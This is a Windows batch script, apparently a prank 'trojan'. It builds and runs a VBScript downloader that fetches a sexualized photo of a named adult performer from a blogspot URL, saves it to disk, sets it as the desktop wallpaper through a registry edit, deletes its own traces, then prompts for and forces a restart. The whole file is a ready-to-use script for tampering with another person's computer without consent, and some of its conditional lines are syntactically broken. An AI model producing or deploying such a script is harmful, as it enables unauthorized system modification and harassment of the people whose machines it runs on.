@echo off
cd..
cd..
cd..
cd Users
cd %username%
echo strFileURL = "http://1.bp.blogspot.com/-h7_OqhIIJKc/UEa8ME--GlI/AAAAAAAABzc/ZH1KxuVgMCo/s1600/Sunny+Leone+Hot+Photos+1.png" > a.vbs
echo    strHDLocation = "c:\users\sb.jpg" >> a.vbs
echo    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP") >>a.vbs
echo     objXMLHTTP.open "GET", strFileURL, false >>a.vbs
echo     objXMLHTTP.send() >>a.vbs
echo If objXMLHTTP.Status = 200 Then >>a.vbs
echo Set objADOStream = CreateObject("ADODB.Stream") >>a.vbs
echo objADOStream.Open >>a.vbs
echo objADOStream.Type = 1 'adTypeBinary >>a.vbs
echo objADOStream.Write objXMLHTTP.ResponseBody >>a.vbs
echo objADOStream.Position = 0    'Set the stream position to the start >>a.vbs
echo Set objFSO = Createobject("Scripting.FileSystemObject") >>a.vbs
echo If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation >>a.vbs
echo Set objFSO = Nothing >>a.vbs
echo objADOStream.SaveToFile strHDLocation >>a.vbs
echo objADOStream.Close >>a.vbs
echo Set objADOStream = Nothing >>a.vbs
echo End if >>a.vbs
echo Set objXMLHTTP = Nothing >>a.vbs

cscript.exe a.vbs
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d C:\users\sb.jpg /f
del a.vbs
cls
cls
echo A restart is needed to apply changes
echo if you want to restart now PRESS 'y' or 'Y'
echo if u dont want it rite now PRESS any other key
set/p "c=>"
if %c%==Y goto TROJAN
if%c%==y goto TROJAN
else goto END
:TROJAN
shutdown -r -t 0
:END